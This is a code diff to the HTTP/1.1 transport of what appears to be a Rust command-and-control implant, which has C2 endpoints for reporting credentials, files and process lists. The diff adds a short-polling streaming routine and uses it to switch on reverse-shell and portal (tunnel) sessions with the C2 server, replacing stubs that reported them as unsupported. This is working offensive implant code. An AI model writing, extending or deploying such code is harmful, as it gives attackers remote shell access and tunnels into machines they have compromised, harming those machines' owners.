@@ -89,7 +89,8 @@ static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
 static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
 static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
 static REPORT_OUTPUT_PATH: &str = "/c2.C2/ReportOutput";
-static _REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
+static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
+static CREATE_PORTAL_PATH: &str = "/c2.C2/CreatePortal";
 
 // Marshal: Encode and encrypt a message using the ChachaCodec
 // Uses the helper functions exported from pb::xchacha
@@ -166,6 +167,92 @@ impl std::fmt::Debug for HTTP {
 }
 
 impl HTTP {
+    async fn handle_short_poll_streaming<Req, Resp>(
+        &self,
+        mut rx: tokio::sync::mpsc::Receiver<Req>,
+        tx: tokio::sync::mpsc::Sender<Resp>,
+        path: &'static str,
+    ) -> Result<()>
+    where
+        Req: Message + Send + 'static,
+        Resp: Message + Default + Send + 'static,
+    {
+        loop {
+            // Buffer to hold messages to send in this polling interval
+            let mut messages = Vec::new();
+
+            // Check if there's any outgoing message (blocks until one is available or channel closed)
+            match tokio::time::timeout(std::time::Duration::from_millis(50), rx.recv()).await {
+                Ok(Some(msg)) => {
+                    messages.push(msg);
+
+                    // Grab any other immediately available messages
+                    while let Ok(msg) = rx.try_recv() {
+                        messages.push(msg);
+                    }
+                }
+                Ok(None) => {
+                    // Channel closed, terminate streaming
+                    break;
+                }
+                Err(_) => {
+                    // Timeout (50ms elapsed, no message). Continue loop to send empty payload/ping
+                }
+            }
+
+            // Prepare the body with encoded gRPC frames
+            let mut request_body = BytesMut::new();
+            for msg in messages {
+                let request_bytes = match marshal_with_codec::<Req, Resp>(msg) {
+                    Ok(bytes) => bytes,
+                    Err(err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("Failed to marshal streaming message: {}", err);
+                        continue;
+                    }
+                };
+                let frame_header = grpc_frame::FrameHeader::new(request_bytes.len() as u32);
+                request_body.extend_from_slice(&frame_header.encode());
+                request_body.extend_from_slice(&request_bytes);
+            }
+
+            // Build and send the HTTP request
+            let uri = self.build_uri(path)?;
+            let req = self
+                .request_builder(uri)
+                .body(hyper_legacy::Body::from(request_body.freeze()))
+                .context("Failed to build HTTP request")?;
+
+            let response = match self.send_and_validate(req).await {
+                Ok(resp) => resp,
+                Err(err) => {
+                    #[cfg(debug_assertions)]
+                    log::error!("Failed to send short poll HTTP request: {}", err);
+                    tokio::time::sleep(std::time::Duration::from_secs(1)).await;
+                    continue;
+                }
+            };
+
+            // Stream and process response frames
+            let result = Self::stream_grpc_frames::<Req, Resp, _>(response, |response_msg| {
+                tx.blocking_send(response_msg).map_err(|err| {
+                    anyhow::anyhow!("Failed to send response through channel: {}", err)
+                })
+            })
+            .await;
+
+            if let Err(err) = result {
+                #[cfg(debug_assertions)]
+                log::error!("Failed to process response frames: {}", err);
+            }
+
+            // Adding a small delay to prevent tight loop spinning if rx channel isn't busy
+            tokio::time::sleep(std::time::Duration::from_millis(500)).await;
+        }
+
+        Ok(())
+    }
+
     /// Build URI from path
     fn build_uri(&self, path: &str) -> Result<hyper_legacy::Uri> {
         let url = format!("{}{}", self.base_url, path);
@@ -537,22 +624,20 @@ impl Transport for HTTP {
 
     async fn reverse_shell(
         &mut self,
-        _rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
-        _tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
+        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
+        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
     ) -> Result<()> {
-        Err(anyhow::anyhow!(
-            "http/1.1 transport does not support reverse shell"
-        ))
+        self.handle_short_poll_streaming(rx, tx, REVERSE_SHELL_PATH)
+            .await
     }
 
     async fn create_portal(
         &mut self,
-        _rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
-        _tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
+        rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
+        tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
     ) -> Result<()> {
-        Err(anyhow::anyhow!(
-            "http/1.1 transport does not support portal"
-        ))
+        self.handle_short_poll_streaming(rx, tx, CREATE_PORTAL_PATH)
+            .await
     }
 
     fn get_type(&mut self) -> pb::c2::transport::Type {
